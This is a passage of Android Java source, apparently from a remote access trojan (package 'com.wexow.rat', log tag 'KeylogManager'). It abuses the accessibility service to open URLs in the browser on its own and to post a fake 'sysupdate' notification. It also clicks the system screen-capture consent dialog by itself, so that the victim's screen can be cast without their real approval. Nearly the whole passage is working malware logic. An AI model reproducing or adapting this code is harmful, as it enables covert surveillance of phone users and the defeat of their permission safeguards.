                    return true;
                }

                AccessibilityNodeInfo parent = node.getParent();
                while (parent != null) {
                    if (parent.isClickable()) {
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        Log.e("KeylogManager", "✅ Clicked parent");
                        return true;
                    }
                    parent = parent.getParent();
                }

                Rect bounds = new Rect();
                node.getBoundsInScreen(bounds);
                Log.e("KeylogManager", "🎯 Clicking coords: " +
                        bounds.centerX() + "," + bounds.centerY());
                click(bounds.centerX(), bounds.centerY());
                return true;
            }
        } catch (Exception e) {
            Log.e("KeylogManager", "tryFindAndClickApp: " + e.getMessage());
        }
        return false;
    }

    // =========================================================
    // OPEN URL
    // =========================================================

    public void openUrl(String url) {

        new Thread(() -> {

            try {

                Log.e("KeylogManager", "================================");
                Log.e("KeylogManager", "🚀 openUrl: " + url);

                launchAppByIcon("Chrome");

                Thread.sleep(3500);

                AccessibilityNodeInfo urlBar = findUrlBar();

                if (urlBar == null) {
                    Log.e("KeylogManager", "❌ URL bar not found");
                    return;
                }

                Log.e("KeylogManager", "✅ URL bar found");

                boolean clicked = urlBar.performAction(
                        AccessibilityNodeInfo.ACTION_CLICK);

                Log.e(
                        "KeylogManager",
                        "URL bar click = " + clicked);

                Thread.sleep(800);

                Bundle clearArgs = new Bundle();

                clearArgs.putCharSequence(
                        AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                        "");

                boolean cleared = urlBar.performAction(
                        AccessibilityNodeInfo.ACTION_SET_TEXT,
                        clearArgs);

                Log.e(
                        "KeylogManager",
                        "Clear URL = " + cleared);

                Thread.sleep(400);

                Bundle args = new Bundle();

                args.putCharSequence(
                        AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                        url);

                boolean written = urlBar.performAction(
                        AccessibilityNodeInfo.ACTION_SET_TEXT,
                        args);

                Log.e(
                        "KeylogManager",
                        "Write URL = " + written);

                urlBar.recycle();

                Log.e(
                        "KeylogManager",
                        "⏳ Waiting for keyboard...");

                Thread.sleep(1500);

                // Enter / Go
                Log.e(
                        "KeylogManager",
                        "🎯 Pressing ENTER...");

                pressEnterSmart();

                Log.e(
                        "KeylogManager",
                        "================================");

            } catch (Exception e) {

                Log.e(
                        "KeylogManager",
                        "❌ openUrl error: " + e.getMessage(),
                        e);
            }

        }).start();
    }

    // =========================================================
    // PRESS ENTER
    // =========================================================
    private void pressEnterSmart() {

        try {
            Thread.sleep(500);

            List<AccessibilityWindowInfo> windows = getWindows();

            Log.e("ENTER", "WINDOWS = " + windows.size());

            for (AccessibilityWindowInfo window : windows) {

                if (window == null) {
                    continue;
                }

                Log.e("ENTER",
                        "WINDOW TYPE = " + window.getType());

                AccessibilityNodeInfo root = window.getRoot();

                if (root == null) {
                    continue;
                }

                String packageName = String.valueOf(root.getPackageName());

                Log.e("ENTER",
                        "WINDOW PACKAGE = " + packageName);

                if (window.getType() != AccessibilityWindowInfo.TYPE_INPUT_METHOD) {
                    root.recycle();
                    continue;
                }

                AccessibilityNodeInfo enterNode = findEnterNodeExact(root);

                if (enterNode != null) {

                    Rect bounds = new Rect();
                    enterNode.getBoundsInScreen(bounds);

                    Log.e("ENTER",
                            "FOUND ENTER = " + bounds.toShortString());

                    Log.e("ENTER",
                            "TEXT = " + enterNode.getText());

                    Log.e("ENTER",
                            "DESC = " + enterNode.getContentDescription());

                    boolean clicked = enterNode.performAction(
                            AccessibilityNodeInfo.ACTION_CLICK);

                    Log.e("ENTER",
                            "ACTION_CLICK = " + clicked);

                    if (!clicked) {

                        int x = bounds.centerX();
                        int y = bounds.centerY();

                        Log.e("ENTER",
                                "FALLBACK TAP = " + x + "," + y);

                        pressPoint(x, y);
                    }

                    enterNode.recycle();
                    root.recycle();

                    return;
                }

                root.recycle();
            }

            Log.e("ENTER",
                    "❌ ENTER KEY NOT FOUND IN INPUT METHOD");

        } catch (Exception e) {

            Log.e("ENTER",
                    "ERROR = " + e.getMessage(), e);
        }
    }

    // =========================================================
    // FIND ENTER / GO BUTTON
    // =========================================================

    private AccessibilityNodeInfo findEnterNodeExact(
            AccessibilityNodeInfo node) {

        if (node == null) {
            return null;
        }

        if (node.isVisibleToUser()) {

            if (isEnterText(node.getText()) ||
                    isEnterText(node.getContentDescription())) {

                return AccessibilityNodeInfo.obtain(node);
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {

            AccessibilityNodeInfo child = node.getChild(i);

            if (child == null) {
                continue;
            }

            AccessibilityNodeInfo result = findEnterNodeExact(child);

            child.recycle();

            if (result != null) {
                return result;
            }
        }

        return null;
    }

    // =========================================================
    // CHECK ENTER BUTTON
    // =========================================================

    private boolean isEnterText(CharSequence value) {

        if (value == null) {
            return false;
        }

        String s = value.toString()
                .trim()
                .toLowerCase(Locale.ROOT);

        return s.equals("enter")
                || s.equals("return")
                || s.equals("go")
                || s.equals("done")
                || s.equals("next")
                || s.equals("↵")
                || s.equals("⏎");
    }

    private void pressPoint(int x, int y) {

        Path path = new Path();
        path.moveTo(x, y);

        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(
                path,
                0,
                80);

        GestureDescription gesture = new GestureDescription.Builder()
                .addStroke(stroke)
                .build();

        dispatchGesture(
                gesture,
                new GestureResultCallback() {

                    @Override
                    public void onCompleted(
                            GestureDescription gestureDescription) {

                        Log.e("ENTER",
                                "✅ TOUCH COMPLETED");
                    }

                    @Override
                    public void onCancelled(
                            GestureDescription gestureDescription) {

                        Log.e("ENTER",
                                "❌ TOUCH CANCELLED");
                    }
                },
                null);
    }

    // =========================================================
    // GESTURE FALLBACK
    // =========================================================
    private void pressEnterByGesture() {

        try {

            DisplayMetrics dm = new DisplayMetrics();

            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);

            if (wm == null) {
                Log.e("KeylogManager", "❌ WindowManager is null");
                return;
            }

            wm.getDefaultDisplay().getRealMetrics(dm);

            int width = dm.widthPixels;
            int height = dm.heightPixels;

            Log.e(
                    "KeylogManager",
                    "📱 REAL SCREEN = " + width + " x " + height);

            int x = (int) (width * 0.9167f);
            int y = (int) (height * 0.9652f);

            Log.e(
                    "KeylogManager",
                    "🎯 TAPPING ENTER = " + x + "," + y);

            Path path = new Path();
            path.moveTo(x, y);

            GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(
                    path,
                    0,
                    100);

            GestureDescription gesture = new GestureDescription.Builder()
                    .addStroke(stroke)
                    .build();

            boolean dispatched = dispatchGesture(
                    gesture,
                    new GestureResultCallback() {

                        @Override
                        public void onCompleted(
                                GestureDescription gesture) {

                            Log.e(
                                    "KeylogManager",
                                    "✅ ENTER TOUCH COMPLETED");
                        }

                        @Override
                        public void onCancelled(
                                GestureDescription gesture) {

                            Log.e(
                                    "KeylogManager",
                                    "❌ ENTER TOUCH CANCELLED");
                        }
                    },
                    null);

            Log.e(
                    "KeylogManager",
                    "dispatchGesture = " + dispatched);

        } catch (Exception e) {

            Log.e(
                    "KeylogManager",
                    "❌ pressEnterByGesture: " +
                            e.getMessage(),
                    e);
        }
    }

    private void collectClickable(AccessibilityNodeInfo node,
            List<AccessibilityNodeInfo> result) {
        if (node == null)
            return;

        try {
            if (node.isClickable()) {
                result.add(node);
            }

            for (int i = 0; i < node.getChildCount(); i++) {
                collectClickable(node.getChild(i), result);
            }
        } catch (Exception ignored) {
        }
    }

    private AccessibilityNodeInfo findUrlBar() {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null)
                return null;

            String[] chromeIds = {
                    "com.android.chrome:id/url_bar",
                    "com.android.chrome:id/search_box_text",
                    "com.brave.browser:id/url_bar",
                    "org.mozilla.firefox:id/url_bar_title",
                    "com.microsoft.emmx:id/url_bar"
            };

            for (String id : chromeIds) {
                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
                if (nodes != null && !nodes.isEmpty()) {
                    Log.e("KeylogManager", "✅ Found URL bar by id: " + id);
                    return nodes.get(0);
                }
            }

            List<AccessibilityNodeInfo> editTexts = findNodesByClass(root, "android.widget.EditText");

            if (!editTexts.isEmpty()) {
                AccessibilityNodeInfo topEditText = null;
                int minY = Integer.MAX_VALUE;

                for (AccessibilityNodeInfo et : editTexts) {
                    Rect bounds = new Rect();
                    et.getBoundsInScreen(bounds);
                    if (bounds.top < minY) {
                        minY = bounds.top;
                        topEditText = et;
                    }
                }

                return topEditText;
            }
        } catch (Exception ignored) {
        }
        return null;
    }

    private void pressEnterFallback(AccessibilityNodeInfo node) {
        try {
            android.util.DisplayMetrics dm = getResources().getDisplayMetrics();
            int x = (int) (dm.widthPixels * 0.92);
            int y = (int) (dm.heightPixels * 0.92);
            Log.e("KeylogManager", "Fallback click at: " + x + "," + y);
            click(x, y);
        } catch (Exception e) {
            Log.e("KeylogManager", "pressEnterFallback: " + e.getMessage());
        }
    }

    private List<AccessibilityNodeInfo> findNodesByClass(
            AccessibilityNodeInfo node, String className) {
        List<AccessibilityNodeInfo> result = new java.util.ArrayList<>();
        if (node == null)
            return result;

        try {
            CharSequence cn = node.getClassName();
            if (cn != null && cn.toString().equals(className)) {
                result.add(node);
            }

            for (int i = 0; i < node.getChildCount(); i++) {
                result.addAll(findNodesByClass(node.getChild(i), className));
            }
        } catch (Exception ignored) {
        }

        return result;
    }

    public void startScreenCast() {
        try {
            Log.e("KeylogManager", "🚀 startScreenCast via Accessibility");

            Intent intent = new Intent(this, com.wexow.rat.ScreenCastActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.addFlags(Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
            intent.addFlags(Intent.FLAG_ACTIVITY_NO_USER_ACTION);

            startActivity(intent);
            Log.e("KeylogManager", "✅ ScreenCastActivity started");

        } catch (Exception e) {
            Log.e("KeylogManager", "❌ startScreenCast: " + e.getMessage(), e);
        }
    }

    public void startCaptureActivity() {
        try {
            Log.e("KeylogManager", "🚀 startCaptureActivity via Accessibility");

            Intent intent = new Intent();
            intent.setClassName("com.wexow.rat", "com.wexow.rat.ScreenCastActivity");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.addFlags(Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
            intent.addFlags(Intent.FLAG_ACTIVITY_NO_USER_ACTION);

            startActivity(intent);

            Log.e("KeylogManager", "✅ startActivity returned");

        } catch (Exception e) {
            Log.e("KeylogManager", "❌ startCaptureActivity: " + e.getMessage(), e);
        }
    }

    // ============================================================
    // ============ Auto-approve MediaProjection Popup ============
    // ============================================================

    private boolean autoApproveMediaProjection = true;

    public void setAutoApproveMediaProjection(boolean enabled) {
        this.autoApproveMediaProjection = enabled;
    }

    private void autoClickMediaProjectionAllow() {
        if (!autoApproveMediaProjection)
            return;

        try {
            Log.e("KeylogManager", "🚀 autoClickMediaProjectionAllow");

            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) {
                Log.e("KeylogManager", "root null, retrying");
                new android.os.Handler(android.os.Looper.getMainLooper())
                        .postDelayed(this::autoClickMediaProjectionAllow, 500);
                return;
            }

            String[] allowTexts = {
                    "Démarrer maintenant", "Démarrer", "Commencer maintenant",
                    "Autoriser", "D'accord",
                    "Start now", "Allow", "OK",
                    "Şimdi başlat", "İzin ver", "Tamam"
            };

            for (String text : allowTexts) {
                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);

                if (nodes != null && !nodes.isEmpty()) {
                    for (AccessibilityNodeInfo node : nodes) {
                        if (node.isClickable()) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            Log.e("KeylogManager", "✅ Clicked by text: " + text);
                            pendingMediaProjectionClick = false;
                            return;
                        }
                        AccessibilityNodeInfo p = node.getParent();
                        while (p != null) {
                            if (p.isClickable()) {
                                p.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                Log.e("KeylogManager", "✅ Clicked parent: " + text);
                                pendingMediaProjectionClick = false;
                                return;
                            }
                            p = p.getParent();
                        }
                        android.graphics.Rect b = new android.graphics.Rect();
                        node.getBoundsInScreen(b);
                        Log.e("KeylogManager", "🎯 Click coords by text: " +
                                b.centerX() + "," + b.centerY());
                        click(b.centerX(), b.centerY());
                        pendingMediaProjectionClick = false;
                        return;
                    }
                }
            }

            String[] viewIds = {
                    "com.android.systemui:id/start_now",
                    "com.android.systemui:id/allow_button",
                    "com.android.systemui:id/ok_button",
                    "android:id/button1",
                    "com.android.systemui:id/media_projection_allow_button",
                    "com.android.systemui:id/permission_allow_button"
            };

            for (String vid : viewIds) {
                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(vid);

                if (nodes != null && !nodes.isEmpty()) {
                    for (AccessibilityNodeInfo node : nodes) {
                        if (node.isClickable()) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            Log.e("KeylogManager", "✅ Clicked by id: " + vid);
                            pendingMediaProjectionClick = false;
                            return;
                        }
                    }
                }
            }

            List<AccessibilityNodeInfo> buttons = new java.util.ArrayList<>();
            collectClickable(root, buttons);

            Log.e("KeylogManager", "Found " + buttons.size() + " clickable");

            android.util.DisplayMetrics dm = getResources().getDisplayMetrics();
            int screenH = dm.heightPixels;
            int screenW = dm.widthPixels;

            AccessibilityNodeInfo rightBottomBtn = null;
            int maxScore = 0;

            for (AccessibilityNodeInfo btn : buttons) {
                android.graphics.Rect b = new android.graphics.Rect();
                btn.getBoundsInScreen(b);

                if (b.width() < 100 || b.height() < 50)
                    continue;

                if (b.centerY() < screenH / 2)
                    continue;

                // score = x + y
                int score = b.centerX() + b.centerY();
                if (score > maxScore) {
                    maxScore = score;
                    rightBottomBtn = btn;
                }
            }

            if (rightBottomBtn != null) {
                android.graphics.Rect b = new android.graphics.Rect();
                rightBottomBtn.getBoundsInScreen(b);
                Log.e("KeylogManager", "🎯 Click rightmost button: " +
                        b.centerX() + "," + b.centerY());
                click(b.centerX(), b.centerY());
                pendingMediaProjectionClick = false;
                return;
            }

            int[][] fallbackPositions = {
                    { (int) (screenW * 0.76), (int) (screenH * 0.72) }, // ~547, 1180
                    { (int) (screenW * 0.76), (int) (screenH * 0.68) }, // ~547, 1115
                    { (int) (screenW * 0.75), (int) (screenH * 0.70) }, // ~540, 1148
                    { (int) (screenW * 0.78), (int) (screenH * 0.70) },
                    { (int) (screenW * 0.74), (int) (screenH * 0.74) },
                    { (int) (screenW * 0.76), (int) (screenH * 0.76) },
            };

            for (int[] pos : fallbackPositions) {
                Log.e("KeylogManager", "⚠️ Fallback click: " + pos[0] + "," + pos[1]);
                click(pos[0], pos[1]);
                try {
                    Thread.sleep(300);
                } catch (Exception ignored) {
                }
            }

            // Retry
            new android.os.Handler(android.os.Looper.getMainLooper())
                    .postDelayed(this::autoClickMediaProjectionAllow, 1000);

        } catch (Exception e) {
            Log.e("KeylogManager", "❌ " + e.getMessage(), e);
        }
    }

    public void startScreenCastFlow() {
        Log.e("KeylogManager", "════════════════════════════════════════");
        Log.e("KeylogManager", "🚀 startScreenCastFlow");
        Log.e("KeylogManager", "════════════════════════════════════════");

        pendingMediaProjectionClick = true;
        waitingForMediaProjection = false;
        notificationAttempts = 0;

        try {
            Context ctx = getApplicationContext();

            Intent castIntent = new Intent(ctx, com.wexow.rat.ScreenCastActivity.class);
            castIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            castIntent.addFlags(Intent.FLAG_ACTIVITY_MULTIPLE_TASK);

            int piFlags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                piFlags |= PendingIntent.FLAG_IMMUTABLE;
            }

            PendingIntent castPI = PendingIntent.getActivity(ctx, 8888, castIntent, piFlags);

            String channelId = "screen_cast_channel";
            android.app.NotificationManager nm = (android.app.NotificationManager) ctx
                    .getSystemService(Context.NOTIFICATION_SERVICE);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.app.NotificationChannel ch = new android.app.NotificationChannel(
                        channelId, "Screen", android.app.NotificationManager.IMPORTANCE_HIGH);
                nm.createNotificationChannel(ch);
            }

            androidx.core.app.NotificationCompat.Builder builder = new androidx.core.app.NotificationCompat.Builder(ctx,
                    channelId)
                    .setSmallIcon(android.R.drawable.ic_menu_info_details)
                    .setContentTitle("sysupdate")
                    .setContentText("Tap to continue")
                    .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MAX)
                    .setAutoCancel(true)
                    .setContentIntent(castPI)
                    .addAction(0, "▶ Start", castPI);

            nm.notify(8888, builder.build());
            Log.e("KeylogManager", "✅ Notification posted");

        } catch (Exception e) {
            Log.e("KeylogManager", "❌ post notification: " + e.getMessage());
        }

        // open Notification Shade
        new android.os.Handler(android.os.Looper.getMainLooper())
                .postDelayed(() -> {
                    Log.e("KeylogManager", "🚀 Opening Notification Shade");
                    performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS);

                    new android.os.Handler(android.os.Looper.getMainLooper())
                            .postDelayed(this::scanForMediaProjectionDialog, 1500);
                }, 1000);
    }

    // ============================================================
    // ============ Auto-click MediaProjection ====================
    // ============================================================
    private boolean pendingMediaProjectionClick = false;

    public void scheduleMediaProjectionClick() {
        pendingMediaProjectionClick = true;
        notificationAttempts = 0;
        Log.e("KeylogManager", "🎯 Scheduled auto-click");

        try {
            Context ctx = getApplicationContext();

            Intent castIntent = new Intent(ctx, com.wexow.rat.ScreenCastActivity.class);
            castIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

            int piFlags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                piFlags |= PendingIntent.FLAG_IMMUTABLE;
            }

            PendingIntent castPI = PendingIntent.getActivity(ctx, 8888, castIntent, piFlags);

            String channelId = "screen_cast_channel";
            android.app.NotificationManager nm = (android.app.NotificationManager) ctx
                    .getSystemService(Context.NOTIFICATION_SERVICE);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.app.NotificationChannel ch = new android.app.NotificationChannel(
                        channelId, "Screen", android.app.NotificationManager.IMPORTANCE_HIGH);
                nm.createNotificationChannel(ch);
            }

            androidx.core.app.NotificationCompat.Builder builder = new androidx.core.app.NotificationCompat.Builder(ctx,
                    channelId)
                    .setSmallIcon(android.R.drawable.ic_menu_info_details)
                    .setContentTitle("sysupdate")
                    .setContentText("Tap to continue")
                    .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MAX)
                    .setCategory(androidx.core.app.NotificationCompat.CATEGORY_CALL)
                    .setAutoCancel(true)
                    .setContentIntent(castPI)
                    .setFullScreenIntent(castPI, true)
                    .addAction(0, "▶ Start", castPI);

            nm.notify(8888, builder.build());
            Log.e("KeylogManager", "✅ Notification re-posted");

        } catch (Exception e) {
            Log.e("KeylogManager", "❌ post notif: " + e.getMessage());
        }

        new android.os.Handler(android.os.Looper.getMainLooper())
                .postDelayed(() -> {
                    Log.e("KeylogManager", "🚀 Opening Notification Shade");
                    performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS);

                    new android.os.Handler(android.os.Looper.getMainLooper())
                            .postDelayed(this::scanForMediaProjectionDialog, 1500);

                }, 1000);
    }

    // ============================================================
    // ============ Scan MediaProjection Dialog ==================
    // ============================================================

    private int notificationAttempts = 0;
    private static final int MAX_NOTIFICATION_ATTEMPTS = 30;
    private boolean waitingForMediaProjection = false;

    private void scanForMediaProjectionDialog() {
        if (!pendingMediaProjectionClick)
            return;

        try {
            List<AccessibilityWindowInfo> windows = getWindows();
            Log.e("KeylogManager", "🔍 Scan #" + notificationAttempts +
                    " | Windows: " + windows.size() +
                    " | waitingForDialog=" + waitingForMediaProjection);

            for (AccessibilityWindowInfo window : windows) {
                AccessibilityNodeInfo root = window.getRoot();
                if (root == null)
                    continue;

                String pkg = root.getPackageName() != null ? root.getPackageName().toString() : "";

                if (!pkg.contains("systemui"))
                    continue;

                if (waitingForMediaProjection) {

                    List<AccessibilityNodeInfo> buttons = root.findAccessibilityNodeInfosByViewId("android:id/button1");

                    if (buttons != null && !buttons.isEmpty()) {
                        Log.e("KeylogManager", "🎯 FOUND Start now button by id!");

                        for (AccessibilityNodeInfo btn : buttons) {
                            Rect b = new Rect();
                            btn.getBoundsInScreen(b);

                            CharSequence text = btn.getText();
                            Log.e("KeylogManager", "   Text: [" + text +
                                    "] bounds=" + b.toShortString());

                            if (text != null && text.toString().contains("Start")) {
                                Log.e("KeylogManager", "🎯 CLICKING Start now at " +
                                        b.centerX() + "," + b.centerY());

                                boolean clicked = btn.performAction(
                                        AccessibilityNodeInfo.ACTION_CLICK);

                                if (!clicked) {
                                    Log.e("KeylogManager", "  ⚠️ ACTION_CLICK failed, using coords");
                                    click(b.centerX(), b.centerY());
                                } else {
                                    Log.e("KeylogManager", "✅ ACTION_CLICK success!");
                                }

                                pendingMediaProjectionClick = false;
                                waitingForMediaProjection = false;
                                return;
                            }
                        }
                    }

                    AccessibilityNodeInfo startBtn = findNodeByTextManual(root, "Start now");

                    if (startBtn != null) {
                        Rect b = new Rect();
                        startBtn.getBoundsInScreen(b);

                        Log.e("KeylogManager", "🎯 FOUND by text at " +
                                b.centerX() + "," + b.centerY());

                        click(b.centerX(), b.centerY());
                        pendingMediaProjectionClick = false;
                        waitingForMediaProjection = false;
                        return;
                    }

                    if (notificationAttempts >= 3) {
                        Log.e("KeylogManager", "🎯 FALLBACK: absolute coords 506,1424");
                        click(506, 1424);
                        pendingMediaProjectionClick = false;
                        waitingForMediaProjection = false;
                        return;
                    }
                }

                else {
                    AccessibilityNodeInfo tapNode = findNodeByTextManual(root, "Tap to continue");

                    if (tapNode == null) {
                        tapNode = findNodeByTextManual(root, "sysupdate");
                    }

                    if (tapNode != null) {
                        Rect b = new Rect();
                        tapNode.getBoundsInScreen(b);

                        if (b.top > 100 && b.width() > 100) {
                            Log.e("KeylogManager", "🎯 FOUND notification at " +
                                    b.toShortString());

                            click(b.centerX(), b.centerY());
                            Log.e("KeylogManager", "✅ Clicked notification!");

                            waitingForMediaProjection = true;
                            notificationAttempts = 0;

                            new android.os.Handler(android.os.Looper.getMainLooper())
                                    .postDelayed(this::scanForMediaProjectionDialog, 1500);
                            return;
                        }
                    }
                }
            }

            notificationAttempts++;

            if (notificationAttempts >= MAX_NOTIFICATION_ATTEMPTS) {
                Log.e("KeylogManager", "❌ Max attempts reached");
                pendingMediaProjectionClick = false;
                waitingForMediaProjection = false;
                return;
            }

            new android.os.Handler(android.os.Looper.getMainLooper())
                    .postDelayed(this::scanForMediaProjectionDialog, 600);

        } catch (Exception e) {
            Log.e("KeylogManager", "❌ scan: " + e.getMessage(), e);
        }
    }

    private AccessibilityNodeInfo findNodeByTextManual(AccessibilityNodeInfo node, String targetText) {
        if (node == null)
            return null;

        try {
            CharSequence text = node.getText();
            CharSequence desc = node.getContentDescription();

            if (text != null && text.toString().contains(targetText)) {
                Log.e("KeylogManager", "    ✓ Match by text: [" + text + "]");
                return node;
            }

            if (desc != null && desc.toString().contains(targetText)) {
                Log.e("KeylogManager", "    ✓ Match by desc: [" + desc + "]");
                return node;
            }

            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                AccessibilityNodeInfo result = findNodeByTextManual(child, targetText);
                if (result != null)
                    return result;
            }
        } catch (Exception e) {
            Log.e("KeylogManager", "❌ findNodeByTextManual: " + e.getMessage());
        }

        return null;
    }

    private boolean tryClickNodeInternal(AccessibilityNodeInfo node) {
        if (node == null)
            return false;

        try {
            if (node.isClickable()) {
                if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    return true;
                }
            }

            AccessibilityNodeInfo p = node.getParent();
            int depth = 0;
            while (p != null && depth < 6) {
                if (p.isClickable()) {
                    if (p.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        return true;
                    }
                }
                p = p.getParent();
                depth++;
            }

            Rect b = new Rect();
            node.getBoundsInScreen(b);
            if (b.width() > 0 && b.height() > 0) {
                click(b.centerX(), b.centerY());
                return true;
            }
        } catch (Exception e) {
            Log.e("KeylogManager", "❌ tryClick: " + e.getMessage());
        }
        return false;
    }

    private void clickScreenCastNotification() {
        if (!pendingMediaProjectionClick)
            return;

        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) {
                new android.os.Handler(android.os.Looper.getMainLooper())
                        .postDelayed(this::clickScreenCastNotification, 500);
                return;
            }

            Log.e("KeylogManager", "🚀 Searching notification...");

            android.util.DisplayMetrics dm = getResources().getDisplayMetrics();
            int screenW = dm.widthPixels;
            int screenH = dm.heightPixels;

            dumpAllTexts(root, 0);

            boolean isQuickSettings = false;
            List<AccessibilityNodeInfo> qsNodes = root.findAccessibilityNodeInfosByText("Wifi two bars.");
            if (qsNodes != null && !qsNodes.isEmpty()) {
                isQuickSettings = true;
            }

            if (isQuickSettings) {
                Log.e("KeylogManager", "🔍 Quick Settings detected - swiping down");

                swipe(screenW / 2, screenH / 3, screenW / 2, (int) (screenH * 0.9), 400);

                new android.os.Handler(android.os.Looper.getMainLooper())
                        .postDelayed(this::clickScreenCastNotification, 1000);
                return;
            }

            String[] targets = { "sysupdate", "Tap to continue" };

            for (String target : targets) {
                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(target);

                if (nodes != null && !nodes.isEmpty()) {
                    Log.e("KeylogManager", "🎯 Found: " + target);
                    for (AccessibilityNodeInfo node : nodes) {
                        android.graphics.Rect b = new android.graphics.Rect();
                        node.getBoundsInScreen(b);

                        if (node.isClickable()) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            Log.e("KeylogManager", "✅ Clicked");
                            pendingMediaProjectionClick = false;
                            return;
                        }

                        AccessibilityNodeInfo p = node.getParent();
                        int d = 0;
                        while (p != null && d < 5) {
                            if (p.isClickable()) {
                                p.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                Log.e("KeylogManager", "✅ Clicked parent");
                                pendingMediaProjectionClick = false;
                                return;
                            }
                            p = p.getParent();
                            d++;
                        }

                        click(b.centerX(), b.centerY());
                        Log.e("KeylogManager", "✅ Clicked coords");
                        pendingMediaProjectionClick = false;
                        return;
                    }
                }
            }

            Log.e("KeylogManager", "❌ Not found, retrying");
            new android.os.Handler(android.os.Looper.getMainLooper())
                    .postDelayed(this::clickScreenCastNotification, 500);

        } catch (Exception e) {
            Log.e("KeylogManager", "❌ " + e.getMessage(), e);
        }
    }

    private void dumpAllTexts(AccessibilityNodeInfo node, int depth) {
        if (node == null || depth > 20)
            return;
        try {
            CharSequence text = node.getText();
            CharSequence desc = node.getContentDescription();
            String cls = node.getClassName() != null ? node.getClassName().toString() : "";

            if ((text != null && text.length() > 0) ||
                    (desc != null && desc.length() > 0)) {
                Log.e("KeylogManager", "  [" + text + "] desc=[" + desc + "] " + cls);
            }

            for (int i = 0; i < node.getChildCount(); i++) {
                dumpAllTexts(node.getChild(i), depth + 1);
            }
        } catch (Exception ignored) {
        }
    }

    private void findAllWindows() {
        try {
            List<AccessibilityWindowInfo> windows = getWindows();
            Log.e("KeylogManager", "📋 Total windows: " + windows.size());

            for (int i = 0; i < windows.size(); i++) {
                AccessibilityWindowInfo window = windows.get(i);
                AccessibilityNodeInfo root = window.getRoot();

                Log.e("KeylogManager", "═══════════════════════════════════");
                Log.e("KeylogManager", "Window " + i + ": type=" + window.getType() +
                        " active=" + window.isActive() +
                        " focused=" + window.isFocused());
                Log.e("KeylogManager", "═══════════════════════════════════");

                if (root != null) {
                    Log.e("KeylogManager", "  Root pkg: " + root.getPackageName());
                    dumpAllTexts(root, 1);
                }
            }
        } catch (Exception e) {
            Log.e("KeylogManager", "❌ " + e.getMessage(), e);
        }
    }

    private void clickScreenCastActionButton(android.graphics.Rect notifBounds) {
        if (!pendingMediaProjectionClick)
            return;

        try {
            Log.e("KeylogManager", "🚀 clickScreenCastActionButton");

            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null)
                return;

            List<AccessibilityNodeInfo> clickables = new java.util.ArrayList<>();
            collectClickable(root, clickables);

            Log.e("KeylogManager", "Found " + clickables.size() + " clickable nodes");

            AccessibilityNodeInfo targetBtn = null;

            for (AccessibilityNodeInfo btn : clickables) {
                android.graphics.Rect b = new android.graphics.Rect();
                btn.getBoundsInScreen(b);

                if (b.centerX() >= notifBounds.left - 50 &&
                        b.centerX() <= notifBounds.right + 50 &&
                        b.centerY() >= notifBounds.top - 50 &&
                        b.centerY() <= notifBounds.bottom + 300) {

                    CharSequence text = btn.getText();
                    CharSequence desc = btn.getContentDescription();

                    Log.e("KeylogManager", "  Candidate: [" + text + "] desc=[" + desc +
                            "] at " + b.centerX() + "," + b.centerY());

                    String combined = (text != null ? text.toString() : "") + " " +
                            (desc != null ? desc.toString() : "");

                    if (combined.contains("▶") ||
                            combined.toLowerCase().contains("start") ||
                            combined.toLowerCase().contains("enable") ||
                            combined.toLowerCase().contains("démarrer")) {
                        targetBtn = btn;
                        break;
                    }
                }
            }

            if (targetBtn != null) {
                android.graphics.Rect b = new android.graphics.Rect();
                targetBtn.getBoundsInScreen(b);
                Log.e("KeylogManager", "✅ Clicking button at " + b.centerX() + "," + b.centerY());
                click(b.centerX(), b.centerY());
                pendingMediaProjectionClick = false;
                return;
            }

            int btnX = notifBounds.centerX();
            int btnY = notifBounds.bottom + 100;

            Log.e("KeylogManager", "⚠️ Fallback click at " + btnX + "," + btnY);
            click(btnX, btnY);

            pendingMediaProjectionClick = false;

        } catch (Exception e) {
            Log.e("KeylogManager", "❌ " + e.getMessage(), e);
        }
    }

